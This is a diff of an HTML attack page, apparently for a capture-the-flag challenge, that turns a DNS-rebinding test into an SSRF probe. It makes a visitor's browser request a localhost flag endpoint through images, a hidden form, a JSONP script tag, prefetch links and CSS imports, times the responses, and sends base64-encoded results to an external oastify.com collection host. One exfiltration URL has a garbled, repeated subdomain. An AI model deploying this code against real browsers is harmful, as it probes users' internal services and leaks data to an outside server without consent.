@@ -1,62 +1,87 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>DNS Rebinding Simulation</title>
+    <title>SSRF Test</title>
 </head>
 <body>
 <script>
 setTimeout(() => {
-    // Method 1: Use mode 'no-cors' (but you can't read response)
-    fetch('http://localhost/flag', { mode: 'no-cors' })
-        .then(() => {
-            // Even with no-cors, we can detect if request was made
-            sendResult('success', 'Request completed (no-cors mode)');
-        })
-        .catch(err => {
-            sendResult('error', err.toString());
-        });
+    // For SSRF, we need to use techniques that work despite CORS
+    // The key is that the browser makes the request even if we can't read the response
+    
+    // Method 1: Simple image request (most reliable for SSRF)
+    const img = new Image();
+    img.src = 'http://localhost/flag?' + Date.now();
+    
+    // Method 2: Form submission
+    const form = document.createElement('form');
+    form.method = 'GET';
+    form.action = 'http://localhost/flag';
+    form.target = 'hiddenFrame';
+    document.body.appendChild(form);
+    
+    // Create hidden iframe for form target
+    const iframe = document.createElement('iframe');
+    iframe.name = 'hiddenFrame';
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+    
+    form.submit();
+    
+    // Method 3: Script tag (bypasses CORS for some endpoints)
+    const script = document.createElement('script');
+    script.src = 'http://localhost/flag?callback=leakData';
+    document.head.appendChild(script);
+    
+    // Method 4: Link prefetch
+    const link = document.createElement('link');
+    link.rel = 'prefetch';
+    link.href = 'http://localhost/flag';
+    document.head.appendChild(link);
+    
+    // Method 5: CSS import (older browsers)
+    const style = document.createElement('style');
+    style.textContent = `@import url('http://localhost/flag');`;
+    document.head.appendChild(style);
+    
+    // Report that SSRF attempts were made
+    sendResult('ssrf_attempted', 'Multiple SSRF methods triggered');
+    
+    // Try to detect timing differences
+    timingAttack();
 
-    // Method 2: Use XMLHttpRequest with error handling
-    const xhr = new XMLHttpRequest();
-    xhr.open('GET', 'http://localhost/flag');
-    xhr.onreadystatechange = function() {
-        if (xhr.readyState === 4) {
-            if (xhr.status === 0 || xhr.status === 200) {
-                // Even with CORS error, we might get some info
-                sendResult('success', 'XHR completed - Status: ' + xhr.status);
-            }
+}, 1000);
+
+function timingAttack() {
+    const start = Date.now();
+    const img = new Image();
+    img.onload = img.onerror = function() {
+        const duration = Date.now() - start;
+        sendResult('timing', `Request took ${duration}ms`);
+        
+        // If request was fast, service might be available
+        if (duration < 100) {
+            sendResult('hint', 'Fast response - service might be running');
         }
     };
-    xhr.onerror = function() {
-        sendResult('error', 'XHR failed - CORS blocked');
-    };
-    xhr.send();
-
-    // Method 3: Use image tag to detect if resource exists
-    const img = new Image();
-    img.onload = function() {
-        sendResult('success', 'Image loaded - resource exists');
-    };
-    img.onerror = function() {
-        sendResult('error', 'Image failed to load');
-    };
-    img.src = 'http://localhost/flag';
-
-}, 2000);
+    img.src = 'http://localhost/flag?timing=' + Date.now();
+}
 
 function sendResult(type, data) {
     const encoded = btoa(data);
-    
-    // Send via image (bypasses CORS)
-    new Image().src = 'https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?' + type + '=' + encoded;
+    // Use multiple methods to exfiltrate data
+    new Image().src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?${type}=${encoded}`;
     
     // Also try fetch with no-cors
-    fetch('https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?' + type + '2=' + encoded, { 
-        mode: 'no-cors' 
+    fetch(`https://7goj29n78aqa9y64r68aqa9y64r68ex4caj1psdj18.oastify.com/?${type}2=${encoded}`, {
+        mode: 'no-cors'
     });
-    
-    console.log(type + ':', data);
 }
+
+// Global function for JSONP callback
+window.leakData = function(data) {
+    sendResult('jsonp_success', JSON.stringify(data));
+};
 </script>
 </body>
 </html>
